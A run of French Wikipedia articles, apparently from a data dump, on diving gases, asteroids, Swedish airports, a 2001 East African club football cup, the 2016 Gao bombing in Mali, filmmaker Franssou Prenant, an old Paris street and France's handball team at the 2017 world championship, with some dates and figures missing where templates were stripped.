Voici une liste incomplète des gaz communément présents dans un environnement de plongée :
Argon.
L'argon (Ar) est un gaz inerte qui est plus narcotique que l'azote, ce qui n'est généralement pas approprié comme un gaz respiratoire de plongée. L'Argox est utilisé pour la recherche de décompression. Il est parfois utilisé pour le gonflage des vêtements secs par des plongeurs dont le gaz respiratoire primaire est à base d'hélium, en raison des bonnes propriétés d'isolation thermique de l'argon. L'argon est plus cher que l'air ou l'oxygène, mais beaucoup moins cher que l'hélium.
Dioxyde de carbone.
Le dioxyde de carbone () est produit par le métabolisme dans le corps humain et peut causer l'empoisonnement de dioxyde de carbone. Lorsque le gaz respiratoire est recyclé dans un système de recycleur, le dioxyde de carbone est éliminé par des épurateurs avant que le gaz ne soit réutilisé.
Monoxyde de carbone.
Le monoxyde de carbone (CO) est produit par combustion incomplète. Voir l'intoxication au monoxyde de carbone.
Quatre sources communes sont :
Hydrocarbures.
Les hydrocarbures (C"x"H"y") sont présents dans les lubrifiants et les carburants des compresseurs. Ils peuvent pénétrer dans les bouteilles de plongée à la suite d'une contamination, de fuites ou d'une combustion incomplète près de la prise d'air.
Teneur en humidité.
Le procédé de compression du gaz dans une bouteille de plongée élimine l'humidité du gaz. Ceci est bon pour la prévention de la corrosion dans la bouteille de plongée, mais signifie que le plongeur inhale du gaz très sec. Le gaz sec extrait l'humidité des poumons du plongeur tout en contribuant à la déshydratation, qui est également considéré comme un facteur prédisposant de risque de maladie de décompression. Il est également inconfortable, causant une bouche sèche et la gorge et de rendre le plongeur assoiffé. Ce problème est réduit dans les recycleurs car la réaction de la chaux sodée, qui élimine le dioxyde de carbone, ramène également l'humidité dans le gaz respiratoire. Dans les climats chauds, la plongée en circuit ouvert peut accélérer l'épuisement dû à la déshydratation. Une autre préoccupation concernant la teneur en humidité est la tendance de l'humidité à se condenser lorsque le gaz est décomprimé en passant à travers le détendeur de plongée ; cela avec une réduction extrême de la température, également en raison de la décompression peut provoquer l'humidité se solidifier comme de la glace. Ce givrage dans un détendeur peut provoquer la cassure des pièces mobiles ou le passage à l'air libre de l'écoulement de l'air, donc une vidange rapide de la bouteille. C'est pour cette raison que les détendeurs de plongée sont généralement construits en laiton, et chromés (pour la protection). Le laiton, avec ses bonnes propriétés thermo-conductrices, conduit rapidement la chaleur de l'eau environnante à l'air frais décompressé, aidant à empêcher le givrage.
Détection et mesure de gaz.
Les plongeurs trouvent difficile de détecter la plupart des gaz qui sont susceptibles d'être présents dans les bouteilles de plongée parce qu'ils sont incolores, inodores et insipides. Des capteurs électroniques existent pour certains gaz, tels que des analyseurs d'oxygène, des analyseurs d'hélium, des détecteurs de monoxyde de carbone et des détecteurs de dioxyde de carbone. Les analyseurs d'oxygène sont généralement utilisés sous l'eau dans les recycleurs. Les analyseurs d'oxygène et d'hélium sont souvent utilisés à la surface pendant le mélange des gaz pour déterminer le pourcentage d'oxygène ou d'hélium dans un mélange de gaz respiratoire. Les méthodes chimiques et autres types de méthodes de détection des gaz ne sont pas souvent utilisées dans la plongée récréative, mais sont utilisées pour des essais périodiques de qualité de l'air comprimé des compresseurs d'air de plongée.

</doc>
<doc id="10577716" url="https://fr.wikipedia.org/wiki?curid=10577716" title="(30094) Rolfebode">
(30094) Rolfebode

(30094) Rolfebode est un astéroïde de la ceinture principale.
Description.
(30094) Rolfebode est un astéroïde de la ceinture principale. Il fut découvert le aux monts Santa Catalina par le programme CSS. Il présente une orbite caractérisée par un demi-grand axe de 2,28 UA, une excentricité de 0,17 et une inclinaison de 6,4° par rapport à l'écliptique.

</doc>
<doc id="10577717" url="https://fr.wikipedia.org/wiki?curid=10577717" title="(30095) Tarabode">
(30095) Tarabode

(30095) Tarabode est un astéroïde de la ceinture principale.
Description.
(30095) Tarabode est un astéroïde de la ceinture principale. Il fut découvert le aux monts Santa Catalina par le programme CSS. Il présente une orbite caractérisée par un demi-grand axe de 2,17 UA, une excentricité de 0,06 et une inclinaison de 4,5° par rapport à l'écliptique.

</doc>
<doc id="10577718" url="https://fr.wikipedia.org/wiki?curid=10577718" title="(30096) Glindadavidson">
(30096) Glindadavidson

(30096) Glindadavidson est un astéroïde de la ceinture principale.
Description.
(30096) Glindadavidson est un astéroïde de la ceinture principale. Il fut découvert le aux monts Santa Catalina par le programme CSS. Il présente une orbite caractérisée par un demi-grand axe de 2,46 UA, une excentricité de 0,16 et une inclinaison de 2,6° par rapport à l'écliptique.

</doc>
<doc id="10577719" url="https://fr.wikipedia.org/wiki?curid=10577719" title="(32618) Leungkamcheung">
(32618) Leungkamcheung

(32618) Leungkamcheung est un astéroïde de la ceinture principale.
Description.
(32618) Leungkamcheung est un astéroïde de la ceinture principale. Il fut découvert le à l'observatoire Desert Eagle par William Kwong Yu Yeung. Il présente une orbite caractérisée par un demi-grand axe de 2,70 UA, une excentricité de 0,02 et une inclinaison de 1,6° par rapport à l'écliptique.

</doc>
<doc id="10577720" url="https://fr.wikipedia.org/wiki?curid=10577720" title="(34995) Dainihonshi">
(34995) Dainihonshi

(34995) Dainihonshi est un astéroïde de la ceinture principale.
Description.
(34995) Dainihonshi est un astéroïde de la ceinture principale. Il fut découvert le à Kiso par Hiroki Kosai et Kiichiro Hurukawa. Il présente une orbite caractérisée par un demi-grand axe de 3,04 UA, une excentricité de 0,23 et une inclinaison de 1,1° par rapport à l'écliptique.

</doc>
<doc id="10577721" url="https://fr.wikipedia.org/wiki?curid=10577721" title="(34996) Mitokoumon">
(34996) Mitokoumon

(34996) Mitokoumon est un astéroïde de la ceinture principale.
Description.
(34996) Mitokoumon est un astéroïde de la ceinture principale. Il fut découvert le à Kiso par Hiroki Kosai et Kiichiro Hurukawa. Il présente une orbite caractérisée par un demi-grand axe de 2,57 UA, une excentricité de 0,16 et une inclinaison de 11,5° par rapport à l'écliptique.

</doc>
<doc id="10577722" url="https://fr.wikipedia.org/wiki?curid=10577722" title="(39734) Marchiori">
(39734) Marchiori

(39734) Marchiori est un astéroïde de la ceinture principale.
Description.
(39734) Marchiori est un astéroïde de la ceinture principale. Il fut découvert le à Sormano par Francesco Manca et Paolo Chiavenna. Il présente une orbite caractérisée par un demi-grand axe de 2,37 UA, une excentricité de 0,23 et une inclinaison de 2,6° par rapport à l'écliptique.

</doc>
<doc id="10577723" url="https://fr.wikipedia.org/wiki?curid=10577723" title="Aérodrome d'Örebro">
Aérodrome d'Örebro

Örebro Airport est situé à au sud-ouest d'Örebro, dans l'est de la Suède. Il s'agit du aéroport suédois en nombre de passagers et le en fret. Il a été ouvert en 1979. L'aéroport a traité en 2013, soit une croissance de 63% par rapport à 2009 ( pour 3881 vols dont 2140 commerciaux).
Compagnies aériennes et destinations.
Edité le 27/02/2023

</doc>
<doc id="10577724" url="https://fr.wikipedia.org/wiki?curid=10577724" title="(39991) Iochroma">
(39991) Iochroma

(39991) Iochroma est un astéroïde de la ceinture principale.
Description.
(39991) Iochroma est un astéroïde de la ceinture principale. Il fut découvert le à Socorro par le projet LINEAR. Il présente une orbite caractérisée par un demi-grand axe de 2,44 UA, une excentricité de 0,16 et une inclinaison de 3,4° par rapport à l'écliptique.

</doc>
<doc id="10577725" url="https://fr.wikipedia.org/wiki?curid=10577725" title="(42566) Ryutaro">
(42566) Ryutaro

(42566) Ryutaro est un astéroïde de la ceinture principale.
Description.
(42566) Ryutaro est un astéroïde de la ceinture principale. Il fut découvert le à Geisei par Tsutomu Seki. Il présente une orbite caractérisée par un demi-grand axe de 2,37 UA, une excentricité de 0,24 et une inclinaison de 6,0° par rapport à l'écliptique.

</doc>
<doc id="10577727" url="https://fr.wikipedia.org/wiki?curid=10577727" title="(43597) Changshaopo">
(43597) Changshaopo

(43597) Changshaopo est un astéroïde de la ceinture principale.
Description.
(43597) Changshaopo est un astéroïde de la ceinture principale. Il fut découvert le à l'observatoire Desert Eagle par William Kwong Yu Yeung. Il présente une orbite caractérisée par un demi-grand axe de 2,24 UA, une excentricité de 0,10 et une inclinaison de 7,2° par rapport à l'écliptique.

</doc>
<doc id="10577728" url="https://fr.wikipedia.org/wiki?curid=10577728" title="Gaz respirable">
Gaz respirable



</doc>
<doc id="10577729" url="https://fr.wikipedia.org/wiki?curid=10577729" title="(43935) Danshechtman">
(43935) Danshechtman

(43935) Danshechtman est un astéroïde de la ceinture principale.
Description.
(43935) Danshechtman est un astéroïde de la ceinture principale. Il fut découvert le à Colleverde par Vincenzo Silvano Casulli. Il présente une orbite caractérisée par un demi-grand axe de 2,14 UA, une excentricité de 0,14 et une inclinaison de 2,9° par rapport à l'écliptique.

</doc>
<doc id="10577730" url="https://fr.wikipedia.org/wiki?curid=10577730" title="(44355) 1998 ST2">
(44355) 1998 ST2

 est un astéroïde de la ceinture principale.
Description.
 est un astéroïde de la ceinture principale. Il fut découvert le à Colleverde par Vincenzo Silvano Casulli. Il présente une orbite caractérisée par un demi-grand axe de 2,55 UA, une excentricité de 0,08 et une inclinaison de 12,6° par rapport à l'écliptique.
Il a été nommé "(44355) Thijsdegraauw" mais cette dénomination a été abrogée.

</doc>
<doc id="10577731" url="https://fr.wikipedia.org/wiki?curid=10577731" title="(52260) Ureshino">
(52260) Ureshino

(52260) Ureshino est un astéroïde de la ceinture principale.
Description.
(52260) Ureshino est un astéroïde de la ceinture principale. Il fut découvert le à Kiso par Hiroki Kosai et Kiichiro Hurukawa. Il présente une orbite caractérisée par un demi-grand axe de 2,40 UA, une excentricité de 0,22 et une inclinaison de 24,9° par rapport à l'écliptique.

</doc>
<doc id="10577732" url="https://fr.wikipedia.org/wiki?curid=10577732" title="(52261) Izumishikibu">
(52261) Izumishikibu

(52261) Izumishikibu est un astéroïde de la ceinture principale.
Description.
(52261) Izumishikibu est un astéroïde de la ceinture principale. Il fut découvert le à Kiso par Hiroki Kosai et Kiichiro Hurukawa. Il présente une orbite caractérisée par un demi-grand axe de 2,97 UA, une excentricité de 0,15 et une inclinaison de 14,0° par rapport à l'écliptique.

</doc>
<doc id="10577734" url="https://fr.wikipedia.org/wiki?curid=10577734" title="(52558) Pigafetta">
(52558) Pigafetta

(52558) Pigafetta est un astéroïde de la ceinture principale.
Description.
(52558) Pigafetta est un astéroïde de la ceinture principale. Il fut découvert le à Colleverde par Vincenzo Silvano Casulli. Il présente une orbite caractérisée par un demi-grand axe de 2,28 UA, une excentricité de 0,11 et une inclinaison de 3,9° par rapport à l'écliptique.
Il est nommé d'après Antonio Pigafetta.

</doc>
<doc id="10577735" url="https://fr.wikipedia.org/wiki?curid=10577735" title="(53843) Antjiekrog">
(53843) Antjiekrog

(53843) Antjiekrog est un astéroïde de la ceinture principale.
Description.
(53843) Antjiekrog est un astéroïde de la ceinture principale. Il fut découvert le à Colleverde par l'observatoire de Colleverde. Il présente une orbite caractérisée par un demi-grand axe de 2,36 UA, une excentricité de 0,08 et une inclinaison de 10,0° par rapport à l'écliptique.

</doc>
<doc id="10577737" url="https://fr.wikipedia.org/wiki?curid=10577737" title="(58498) Octaviopaz">
(58498) Octaviopaz

(58498) Octaviopaz est un astéroïde de la ceinture principale.
Description.
(58498) Octaviopaz est un astéroïde de la ceinture principale. Il fut découvert le à Colleverde par Vincenzo Silvano Casulli. Il présente une orbite caractérisée par un demi-grand axe de 2,73 UA, une excentricité de 0,07 et une inclinaison de 3,9° par rapport à l'écliptique.

</doc>
<doc id="10577738" url="https://fr.wikipedia.org/wiki?curid=10577738" title="(59389) Oskarvonmiller">
(59389) Oskarvonmiller

(59389) Oskarvonmiller est un astéroïde de la ceinture principale.
Description.
(59389) Oskarvonmiller est un astéroïde de la ceinture principale. Il fut découvert le à Modra par Leonard Kornoš et Juraj Tóth. Il présente une orbite caractérisée par un demi-grand axe de 2,46 UA, une excentricité de 0,13 et une inclinaison de 7,5° par rapport à l'écliptique.

</doc>
<doc id="10577740" url="https://fr.wikipedia.org/wiki?curid=10577740" title="(60609) Kerryprice">
(60609) Kerryprice

(60609) Kerryprice est un astéroïde de la ceinture principale.
Description.
(60609) Kerryprice est un astéroïde de la ceinture principale. Il fut découvert le aux monts Santa Catalina par le programme CSS. Il présente une orbite caractérisée par un demi-grand axe de 2,62 UA, une excentricité de 0,06 et une inclinaison de 14,3° par rapport à l'écliptique.

</doc>
<doc id="10577741" url="https://fr.wikipedia.org/wiki?curid=10577741" title="(60614) Tomshea">
(60614) Tomshea

(60614) Tomshea est un astéroïde de la ceinture principale.
Description.
(60614) Tomshea est un astéroïde de la ceinture principale. Il fut découvert le aux monts Santa Catalina par le programme CSS. Il présente une orbite caractérisée par un demi-grand axe de 2,72 UA, une excentricité de 0,10 et une inclinaison de 6,0° par rapport à l'écliptique.
Nom.
Il est nommé d'après .

</doc>
<doc id="10577743" url="https://fr.wikipedia.org/wiki?curid=10577743" title="(66583) Nicandra">
(66583) Nicandra

(66583) Nicandra est un astéroïde de la ceinture principale.
Description.
(66583) Nicandra est un astéroïde de la ceinture principale. Il fut découvert le à Socorro par le projet LINEAR. Il présente une orbite caractérisée par un demi-grand axe de 2,63 UA, une excentricité de 0,25 et une inclinaison de 3,6° par rapport à l'écliptique.

</doc>
<doc id="10577744" url="https://fr.wikipedia.org/wiki?curid=10577744" title="(73686) Nussdorf">
(73686) Nussdorf

(73686) Nussdorf est un astéroïde de la ceinture principale.
Description.
(73686) Nussdorf est un astéroïde de la ceinture principale. Il fut découvert le à Tautenburg par Freimut Börngen et Lutz Dieter Schmadel. Il présente une orbite caractérisée par un demi-grand axe de 2,57 UA, une excentricité de 0,22 et une inclinaison de 3,5° par rapport à l'écliptique.

</doc>
<doc id="10577745" url="https://fr.wikipedia.org/wiki?curid=10577745" title="(73699) Landaupfalz">
(73699) Landaupfalz

(73699) Landaupfalz est un astéroïde de la ceinture principale.
Description.
(73699) Landaupfalz est un astéroïde de la ceinture principale. Il fut découvert le à Tautenburg par Freimut Börngen et Lutz Dieter Schmadel. Il présente une orbite caractérisée par un demi-grand axe de 2,54 UA, une excentricité de 0,29 et une inclinaison de 7,5° par rapport à l'écliptique.

</doc>
<doc id="10577747" url="https://fr.wikipedia.org/wiki?curid=10577747" title="(73701) Siegfriedbauer">
(73701) Siegfriedbauer

(73701) Siegfriedbauer est un astéroïde de la ceinture principale.
Description.
(73701) Siegfriedbauer est un astéroïde de la ceinture principale. Il fut découvert le à Tautenburg par Freimut Börngen et Lutz Dieter Schmadel. Il présente une orbite caractérisée par un demi-grand axe de 2,43 UA, une excentricité de 0,09 et une inclinaison de 3,3° par rapport à l'écliptique.

</doc>
<doc id="10577748" url="https://fr.wikipedia.org/wiki?curid=10577748" title="(79826) Finardi">
(79826) Finardi

(79826) Finardi est un astéroïde de la ceinture principale.
Description.
(79826) Finardi est un astéroïde de la ceinture principale. Il fut découvert le à Pianoro par Vittorio Goretti. Il présente une orbite caractérisée par un demi-grand axe de 2,58 UA, une excentricité de 0,23 et une inclinaison de 3,7° par rapport à l'écliptique.

</doc>
<doc id="10577750" url="https://fr.wikipedia.org/wiki?curid=10577750" title="(84015) Efthymiopoulos">
(84015) Efthymiopoulos

(84015) Efthymiopoulos est un astéroïde de la ceinture principale.
Description.
(84015) Efthymiopoulos est un astéroïde de la ceinture principale. Il fut découvert le à Campo Imperatore par le relevé astronomique CINEOS. Il présente une orbite caractérisée par un demi-grand axe de 2,37 UA, une excentricité de 0,15 et une inclinaison de 5,3° par rapport à l'écliptique.

</doc>
<doc id="10577754" url="https://fr.wikipedia.org/wiki?curid=10577754" title="Coupe CECAFA des clubs 2001">
Coupe CECAFA des clubs 2001

La Coupe Kagame inter-club 2001 est la vingt-septième édition de la Coupe Kagame inter-club, une compétition organisée par la CECAFA (Conseil des Associations de Football d'Afrique de l'Est et Centrale) et qui regroupe les clubs d'Afrique de l'Est s'étant illustré dans leur championnat national. 
Cette édition regroupe huit formations réparties en deux poules. Les deux premiers de chaque poule se qualifient pour la phase finale, jouée en matchs à élimination directe.
C'est le tenant du titre, le club kenyan du Tusker FC qui remporte à nouveau le trophée, après avoir battu en finale leur compatriote d'Oserian Fastac. C'est le quatrième titre de l'histoire du club dans la compétition. Tusker réussit à terminer le tournoi sans prendre le moindre but, que ce soit en phase de poules, lors des rencontres à élimination directe et même lors de la séance de tirs au but en finale.
Le Kenya, hôte de la compétition et nation du tenant du titre, a le droit d'engager deux clubs alors que l'ensemble des autres membres de la CECAFA aligne un représentant. Seules neuf fédérations participent à la compétition car la Tanzanie et Zanzibar sont suspendues par la FIFA.
Compétition.
Premier tour.
Groupe A :
Groupe B :

</doc>
<doc id="10577767" url="https://fr.wikipedia.org/wiki?curid=10577767" title="Alain Le Gall">
Alain Le Gall

Alain Le Gall (mort en 1352) est un ecclésiastique breton qui fut évêque de Cornouaille de 1335 à 1352.
Biographie.
Alain Le Gall, ou en breton An Gall, originaire de la paroisse de Riec, serait le fils et homonyme d'Alain Le Gall et de son épouse, peut-être issue du lignage des seigneurs de Léon.
Chanoine et chantre de Quimper, il devient évêque de Cornouaille à la mort d'Alain Gontier. L'année suivante, il dote la cathédrale de la Chapelle de Notre-Dame et de Saint Corentin. Lors de la guerre de Succession de Bretagne, il est, comme l'évêque de Vannes Geoffroy de Saint-Guen, un partisan de Jean de Montfort et de Jeanne de Flandre, et il prête serment au roi Édouard III d'Angleterre lorsque ce dernier débarque à Brest en . L'année suivante, ce monarque le félicite avec les autres partisans pour l'aide qu'il apporte à la cause de Montfort. Après la prise de Quimper en mai 1344, il est contraint de se rapprocher du parti de Charles de Blois. Quand il meurt, le pape Innocent VI le remplace le par un autre bas-breton, Geoffroy de Coëtmoisan, abbé bénédictin de l'abbaye Saint-Pierre de la Couture au Mans.

</doc>
<doc id="10577769" url="https://fr.wikipedia.org/wiki?curid=10577769" title="Aéroport de Växjö">
Aéroport de Växjö



</doc>
<doc id="10577787" url="https://fr.wikipedia.org/wiki?curid=10577787" title="Aéroport d'Halmstad">
Aéroport d'Halmstad



</doc>
<doc id="10577789" url="https://fr.wikipedia.org/wiki?curid=10577789" title="Aérodrome de Karlstad">
Aérodrome de Karlstad

L'aéroport de Karlstad est situé à du centre-ville de Karlstad,en Suède.
Histoire.
L'aéroport a ouvert en 1997. L'aéroport a été construit en remplacement de l'ancien aérodrome Karlstad-Jakobsberg (), dans le but de réduire les nuisances sonores pour les riverains, en raison de son emplacement à 3 km du centre-ville de Karlstad, et aussi pour élargir la piste.
Compagnies aériennes et destinations.
Edité le 27/02/2023
Statistiques.
Statistiques

</doc>
<doc id="10577797" url="https://fr.wikipedia.org/wiki?curid=10577797" title="Kevin Rivera">
Kevin Rivera

Kevin Manuel Rivera Serrano (né le à Cartago) est un coureur cycliste costaricien.
Biographie.
Au début de 2017, l'équipe Androni Giocattoli officialise son arrivée dans l'équipe pour un contrat de quatre ans. À la suite de sa victoire lors du Trofeo Città di Notaresco 2016 en Italie, le manager Gianni Savio lui a fait réaliser des tests physiologiques dans un centre spécialisé avec Michele Bartoli. Après les résultats, Bartoli affirme qu'il n'a jamais vu un coureur avec une aussi grande capacité pulmonaire. Il fait ses débuts professionnels dès le mois de janvier au Tour du Táchira.

</doc>
<doc id="10577801" url="https://fr.wikipedia.org/wiki?curid=10577801" title="Attentat de Gao">
Attentat de Gao

L'attentat de Gao a eu lieu le dans un camp militaire de Gao, pendant la guerre du Mali. Revendiqué par Al-Mourabitoune, un groupe affilié à Al-Qaïda au Maghreb islamique (AQMI), l'attaque vise des groupes armés de la Coordination des mouvements de l'Azawad (CMA) et de la Plateforme des mouvements du 14 juin 2014 d'Alger, elle fait 54 à 77 morts.
Contexte.
Le nord du Mali tombe en 2012 aux mains des rebelles touaregs du MNLA, évincés ensuite par leurs anciens alliés djihadistes, notamment Al-Qaïda au Maghreb islamique. La région est reprise l'année suivante par une coalition de pays africains menée par la France qui lance l'opération Serval en janvier 2013. En août 2014, elle est remplacée par l'opération Barkhane dans tout le Sahel. Malgré tout, les djihadistes restent actifs dans le nord du Mali, profitant notamment des divisions entre groupés armés loyalistes et rebelles indépendantistes.
En 2015, les rebelles de la Coordination des mouvements de l'Azawad (CMA) signent l'accord d'Alger avec le gouvernement malien, son application prévoit notamment la mise en place de patrouilles mixtes entre les anciens belligérants. L'application de l'accord est cependant retardée par des combats à l'été 2015, puis à l'été 2016, entre les rebelles de la CMA et les groupes armés loyalistes de la Plateforme.
Déroulement.
Le matin du mercredi , environ 600 combattants des groupes armés de la CMA, de la Plateforme et quelques militaires maliens se rassemblent dans le camp du Mécanisme opérationnel de coordination (MOC) à Gao, situé à proximité de l'aéroport, tenu par soldats français. 
À , alors que les combattants des groupes armés effectuent une séance d'entraînement avant de commencer une patrouille mixte, un véhicule aux couleurs du MOC force la barrière à l'entrée du camp. Il s'agit en réalité d'un véhicule piégé conduit par un kamikaze. Il explose près des membres de la patrouille, faisant des dizaines de victimes.
L'explosion provoque une panique générale à l'intérieur du camp. La zone est ensuite quadrillée par les casques bleus de la MINUSMA et l'armée malienne.
Bilan humain.
Le soir de l'attaque, le président malien Ibrahim Boubacar Keïta annonce un bilan d'au moins 60 morts et 115 blessés. Le lendemain, l'état-major de l'armée française annonce que le bilan est monté à 77 morts. L'attentat de Gao est alors le plus meurtrier jamais commis au Mali. Le gouvernement malien décrète un deuil national de trois jours.
Le 23 février 2017, le général Amadou Kane, commandant adjoint MINUSMA, déclare que le bilan humain de l'attentat a été revu à la baisse, à 54 morts, après vérifications auprès des listes des combattants des groupes armés et de l'armée malienne. Le décompte erroné des victimes serait dû à la précipitation après l'explosion et à un certain nombre de corps déchiquetés. Cependant le même jour, l'AFP affirme avoir eu accès à un document du MOC qui fait état d'un bilan de 61 morts et 116 blessés.
En mars 2017, l'ONU maintient dans son rapport un bilan de 54 morts et 100 blessés parmi les 600 éléments des forces maliennes, de la CMA et de la Plateforme présents au moment de l'attaque.
Revendication.
L'attentat est revendiqué le jour même par la katiba Al-Mourabitoune, le groupe de Mokhtar Belmokhtar affilié depuis plus d'un an à Al-Qaïda au Maghreb islamique (AQMI). Dans son communiqué, publié par l'agence de presse mauritanienne "Al-Akhbar", le groupe affirme que l'attaque a été menée par un Peul nommé Abdelhadi Al-Foulani ou Abdellah Hadi al-Ansari.
Dans son communiqué, Al-Mourabitoune déclare : . L'objectif est alors d'ébranler le processus de paix.
Suites.
La mise en place du MOC est retardée à cause de l'attentat, les premières patrouilles mixtes ont lieu à Gao le 23 février 2017.

</doc>
<doc id="10577804" url="https://fr.wikipedia.org/wiki?curid=10577804" title="Aérodrome de Kramfors-Sollefteå">
Aérodrome de Kramfors-Sollefteå

Le Höga Kusten Airport, traduit mot à mot Aéroport du "Haut de la Côte", aussi connu comme aérodrome Kramfors-Sollefteå, est un aéroport situé entre les villes de Kramfors et de Sollefteå, en Suède . L'aéroport est toujours nommé Kramfors sur les billets.
Le nombre de passagers en 2012 a été de , en chute libre par rapport aux recensés en 2000. Cele s'explique par les faibles prix des vols pratiqués par des aéroports relativement proche comme Örnsköldsvik et Sundsvall-Härnösand. La fréquentation s'est élevée à seulement en 2008, en raison la faillite de la compagnie aérienne .
Compagnies aériennes et destinations.
Actualisé le 27/02/2023

</doc>
<doc id="10577807" url="https://fr.wikipedia.org/wiki?curid=10577807" title="Franssou Prenant">
Franssou Prenant

Franssou Prenant, née le à Paris, est une monteuse, scénariste et réalisatrice française.
Biographie.
Fille de Marianne et André Prenant, célèbre géographe français, elle naît à Paris le 8 novembre 1952. Ancien résistant devenu géographe, André Prenant s’intéresse à la démographie algérienne et effectue de nombreux voyages entre Alger et Paris, fréquentant des intellectuels comme Kateb Yacine et Malek Haddad. Marianne Prenant écrit pour sa part des articles pour l’Alger Républicain. Le couple s’engage en faveur de l’indépendance de l’Algérie, puis s’y installe en 1963 avec leurs enfants, alors que Franssou y est agée de 11 ans et ce jusqu’en 1966. Elle décrit ces 3 années comme “la découverte de la liberté” et y vit “les moments les plus heureux de son existence”.
D’abord intéressée par l’archéologie, elle choisit d’étudier le cinéma après avoir été marquée par le visionnage de films soviétiques qu’elle découvre à Alger. Elle fait ses études au lycée Marie-Curie (Sceaux) puis intègre l’IDHEC en 1969. C’est en rencontrant Jacques Kebadian qu’elle se rapproche du monde du cinéma et devient assistante sur le tournage du film de Robert Bresson "Le Diable Probablement".
A 19 ans, elle joue son premier role dans le film "Albertine ou les souvenirs parfumés de Marie-Rose", un film militant anti-autoritaire et pro-avortement réalisé par le collectif Eugène Varlin. A travers cette première expérience et cette collaboration avec Jacques Kebadian, elle apprend le montage.
En 1975, elle réalise son premier court métrage comme travail de fin d’étude, "Paradis Perdu", tourné avec des membres des Gazolines. En 1983, elle prolonge son travail avec des figures marginales issues des communautés gays en réalisant "Habibi", cette fois ci en montrant une histoire d’amour entre un jeune homosexuel et un ouvrier algérien qui se rencontrent dans un bar de travesti.
En parallèle de sa carrière de cinéaste, elle effectue le montage d’un certain nombre de films, souvent documentaire, en collaborant à plusieurs reprises avec Jacques Kebadian, mais aussi Raymond Depardon ("Faits Divers, Empty" "Quarter"")," Robert Cahen ("Arrêt sur marche") et Romain Goupil ("Mourir à trente ans"). Avec Raymond Depardon, elle est l’actrice principale du film "Empty" "Quarter".
En 1987, elle réalise "L’Escale de Guinée", un film de voyage qui amorce une série de films documentaires tournés dans différents pays du continent africain. Tourné par Franssou Prenant seule avec une caméra 8mm entre février et juillet 1986, le film est plus un “journal de bord” qu’un documentaire où la cinéaste nous livre à travers un regard intime et sensible ses pensées sur son voyage et sur l’exil.
En 2000, elle réalise son premier long-métrage de fiction, "Paris, mon petit corps est bien las de ce grand monde", une œuvre singulière entre journal filmé et romance, où la cinéaste continue d’explorer des thèmes comme la liberté, la solitude et l’amour dans un Paris estival. Le film est selectionné au festival du film de Locarno en 1999 et au Festival International du film de Rotterdam (IFFR) en 2000.
Par la suite, elle va continuer de réaliser un certain nombre de documentaires dans différents pays comme le Liban ("Sous le ciel lumineux de son pays natal", 2001), la Syrie ("Reviens et prends-moi", 2004), l’Algérie ("I Am Too Sexy for my Body, for my Bo-ody", 2012 puis "Bienvenue à Madagascar", 2015).
Oeuvre cinématographique.
Franssou Prenant se distingue par une approche cinématographique unique : elle privilégie souvent une narration qui mélange le journal filmé et le documentaire, créant ainsi une atmosphère intime où le vécu se mêle à la réflexion sur des thématiques universelles telles que la solitude, l’amour, la liberté et l’exil. Toutefois, elle renie toute étiquette, que ça soit fiction, documentaire ou essai.
Dans ses films, Franssou Prenant explore régulièrement des territoires marginaux, que ce soit à travers des portraits de communautés homosexuelles ou des récits de vie en exil, témoignant de son intérêt pour les histoires et les voix peu entendues. Son travail documentaire, comme dans "L’Escale de Guinée", se singularise par une approche presque autobiographique et un cadrage minimaliste, renforçant l’impression d’un récit de bord sincère et dépouillé.

</doc>
<doc id="10577817" url="https://fr.wikipedia.org/wiki?curid=10577817" title="Tom Cross (monteur)">
Tom Cross (monteur)

Tom Cross (ACE) est un monteur américain.
Biographie.
Tom Cross grandit à Long Island dans une famille mixte, sa mère est vietnamienne. Il obtient son diplôme de beaux-arts en 1993 au Purchase State College, une partie de l'Université d'État de New York. Il commence par monter des publicités à New York avant de déménager à Los Angeles.

</doc>
<doc id="10577824" url="https://fr.wikipedia.org/wiki?curid=10577824" title="Aérodrome de Lycksele">
Aérodrome de Lycksele

L'aérodrome de Lycksele est un aéroport régional à Lycksele, dans le nord de la Suède.
Compagnies aériennes et destinations.
Actualisé le 27/02/2023

</doc>
<doc id="10577837" url="https://fr.wikipedia.org/wiki?curid=10577837" title="UP4">
UP4



</doc>
<doc id="10577840" url="https://fr.wikipedia.org/wiki?curid=10577840" title="Rue de l'Étoile (ancienne voie de Paris)">
Rue de l'Étoile (ancienne voie de Paris)

La rue de l'Étoile est une ancienne voie de Paris qui était située dans l'ancien et qui a été absorbée en 1868 lors des travaux de réaménagements par la rue du Fauconnier.
Origine du nom.
Elle tient sa dénomination d'une maison nommée le « Château de l'Étoile » qui y était située.
Situation.
Située dans l'ancien, quartier de l'Arsenal, la rue de l'Étoile, d'une longueur de , commençait quai des Ormes et finissait au 1, rue de l'Hôtel-de-Ville et au 23, rue des Barrés.
Les numéros de la rue étaient noirs. Le dernier numéro impair était le et le dernier numéro pair était le .
Historique.
On trouve cette voie désignée sous ces différents noms :
Une décision ministérielle du 13 thermidor an VI (), signée François de Neufchâteau, fixe la largeur de cette voie publique à . Cette largeur est portée à , en vertu d'une ordonnance royale du .
Par arrêté en date du , la rue du Fauconnier et la rue de l'Étoile sont réunies sous le nom de « rue du Fauconnier ».

</doc>
<doc id="10577842" url="https://fr.wikipedia.org/wiki?curid=10577842" title="Équipe de France masculine de handball au Championnat du monde 2017">
Équipe de France masculine de handball au Championnat du monde 2017

Cet article relate le parcours de l'Équipe de France masculine de handball lors du Championnat du monde 2017 organisé en France du 11 au . Il s'agit de la de la France aux Championnats du monde qui remet en jeu son titre acquis au Qatar en 2015.
Les « Experts » commencent leur tournoi par deux larges victoires contre le Brésil (31-16) et le Japon (31-19) mais perdent Luka Karabatic sur blessure. Sur leur lancée, les Bleus battent ensuite la Norvège (31-28) et la Russie (35-24) au terme de matchs accomplis pour s'adjuger la première place de leur groupe. 
En huitième de finale, les Experts éliminent l'Islande 31 à 25 malgré un début de match en demi-teinte ponctué par un seul but d'avance à la mi-temps. En quart de finale, les Bleus se qualifient aux dépens de la Suède sur le score de 33 à 30 dans un match serré au cours duquel les Suédois ont pris les commandes plusieurs fois, menant notamment d'un but à la mi-temps. À l'occasion de ces deux rencontres disputées dans le Stade Pierre-Mauroy de Villeneuve-d'Ascq, le record mondial de spectateurs pour un match international de handball est à chaque fois battu avec plus de 28.000 personnes dans les gradins. 
